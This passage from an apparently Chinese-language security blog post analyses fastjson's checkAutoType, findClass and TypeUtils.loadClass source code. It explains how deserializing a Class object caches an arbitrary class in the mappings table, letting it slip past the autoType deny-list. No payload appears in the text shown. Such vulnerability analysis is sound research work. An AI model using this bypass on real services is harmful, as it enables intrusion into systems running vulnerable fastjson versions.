</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>objVal <span style=color:#ff79c6>instanceof</span> String<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    strVal <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>)</span> objVal<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span><span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#6272a4>// ... 省略
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#6272a4></span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#6272a4>// ... 省略
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>(</span>T<span style=color:#ff79c6>)</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>loadClass</span><span style=color:#ff79c6>(</span>strVal<span style=color:#ff79c6>,</span> parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getConfig</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDefaultClassLoader</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>可以看到就是将 val 作为类名, 然后用 classloader 去 load 这个 class, 然后返回这个类的 Class 对象.<br>然后回到 fastjson</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>autoTypeSupport <span style=color:#ff79c6>||</span> expectClass <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span> <span style=color:#6272a4>// &lt;-- 默认 autoType 关闭, expectClass = null 这一段可以无视
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#6272a4></span>    <span style=color:#8be9fd>long</span> hash <span style=color:#ff79c6>=</span> h3<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 3<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>();</span> <span style=color:#ff79c6>++</span>i<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        hash <span style=color:#ff79c6>^=</span> className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>i<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        hash <span style=color:#ff79c6>*=</span> PRIME<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>Arrays<span style=color:#ff79c6>.</span><span style=color:#50fa7b>binarySearch</span><span style=color:#ff79c6>(</span>acceptHashCodes<span style=color:#ff79c6>,</span> hash<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&gt;=</span> 0<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>            clazz <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>loadClass</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>,</span> defaultClassLoader<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>                <span style=color:#ff79c6>return</span> clazz<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>Arrays<span style=color:#ff79c6>.</span><span style=color:#50fa7b>binarySearch</span><span style=color:#ff79c6>(</span>denyHashCodes<span style=color:#ff79c6>,</span> hash<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&gt;=</span> 0 <span style=color:#ff79c6>&amp;&amp;</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClassFromMapping</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> JSONException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;autoType is not support. &#34;</span> <span style=color:#ff79c6>+</span> typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    clazz <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClassFromMapping</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    clazz <span style=color:#ff79c6>=</span> deserializers<span style=color:#ff79c6>.</span><span style=color:#50fa7b>findClass</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>expectClass <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>            <span style=color:#ff79c6>&amp;&amp;</span> clazz <span style=color:#ff79c6>!=</span> java<span style=color:#ff79c6>.</span><span style=color:#50fa7b>util</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>HashMap</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>            <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span>expectClass<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isAssignableFrom</span><span style=color:#ff79c6>(</span>clazz<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> JSONException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;type not match. &#34;</span> <span style=color:#ff79c6>+</span> typeName <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34; -&gt; &#34;</span> <span style=color:#ff79c6>+</span> expectClass<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>    <span style=color:#ff79c6>return</span> clazz<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>重点在 <code>deserializers.findClass(typeName);</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#8be9fd;font-style:italic>public</span> Class <span style=color:#50fa7b>findClass</span><span style=color:#ff79c6>(</span>String keyString<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> buckets<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> i<span style=color:#ff79c6>++)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        Entry bucket <span style=color:#ff79c6>=</span> buckets<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>bucket <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>            <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span>Entry<span style=color:#ff79c6>&lt;</span>K<span style=color:#ff79c6>,</span> V<span style=color:#ff79c6>&gt;</span> entry <span style=color:#ff79c6>=</span> bucket<span style=color:#ff79c6>;</span> entry <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span> entry <span style=color:#ff79c6>=</span> entry<span style=color:#ff79c6>.</span><span style=color:#50fa7b>next</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            Object key <span style=color:#ff79c6>=</span> bucket<span style=color:#ff79c6>.</span><span style=color:#50fa7b>key</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>key <span style=color:#ff79c6>instanceof</span> Class<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>                Class clazz <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>((</span>Class<span style=color:#ff79c6>)</span> key<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>                String className <span style=color:#ff79c6>=</span> clazz<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>keyString<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                    <span style=color:#ff79c6>return</span> clazz<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>                <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>这个 bucket 就是 put 方法会存进去的 bucket, 所以这里因为是内置类, 其实等价于白名单, 所以直接返回了 clazz, autoType 即使关闭也是可以正常反序列化这些对象的. 比如 Integer, String, URL 等等内置常见对象的.</p><p>而问题也是出在这里, 还记得 Class 的反序列化方式么, 会调用 <code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> Class<span style=color:#ff79c6>&lt;?&gt;</span> loadClass<span style=color:#ff79c6>(</span>String className<span style=color:#ff79c6>,</span> ClassLoader classLoader<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>return</span> loadClass<span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>,</span> classLoader<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> Class<span style=color:#ff79c6>&lt;?&gt;</span> loadClass<span style=color:#ff79c6>(</span>String className<span style=color:#ff79c6>,</span> ClassLoader classLoader<span style=color:#ff79c6>,</span> <span style=color:#8be9fd>boolean</span> cache<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>className <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>||</span> className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>==</span> 0<span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    Class<span style=color:#ff79c6>&lt;?&gt;</span> clazz <span style=color:#ff79c6>=</span> mappings<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        <span style=color:#ff79c6>return</span> clazz<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>0<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;[&#39;</span><span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>        Class<span style=color:#ff79c6>&lt;?&gt;</span> componentType <span style=color:#ff79c6>=</span> loadClass<span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>1<span style=color:#ff79c6>),</span> classLoader<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>        <span style=color:#ff79c6>return</span> Array<span style=color:#ff79c6>.</span><span style=color:#50fa7b>newInstance</span><span style=color:#ff79c6>(</span>componentType<span style=color:#ff79c6>,</span> 0<span style=color:#ff79c6>).</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>startsWith</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;L&#34;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;&amp;</span> className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>endsWith</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;;&#34;</span><span style=color:#ff79c6>)){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        String newClassName <span style=color:#ff79c6>=</span> className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>1<span style=color:#ff79c6>,</span> className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>-</span> 1<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        <span style=color:#ff79c6>return</span> loadClass<span style=color:#ff79c6>(</span>newClassName<span style=color:#ff79c6>,</span> classLoader<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff79c6>try</span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>classLoader <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>            clazz <span style=color:#ff79c6>=</span> classLoader<span style=color:#ff79c6>.</span><span style=color:#50fa7b>loadClass</span><span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>cache<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>                mappings<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>,</span> clazz<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>            <span style=color:#ff79c6>return</span> clazz<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>    <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>注意 <code>mappings.put(className, clazz)</code>, 如果这个类存在, 会将其放入 TypeUtils 里面的这个缓存中.</p><p>又回到 checkAutoType 中, 注意这个</p><p>com.alibaba.fastjson.parser.ParserConfig</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    clazz <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClassFromMapping</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
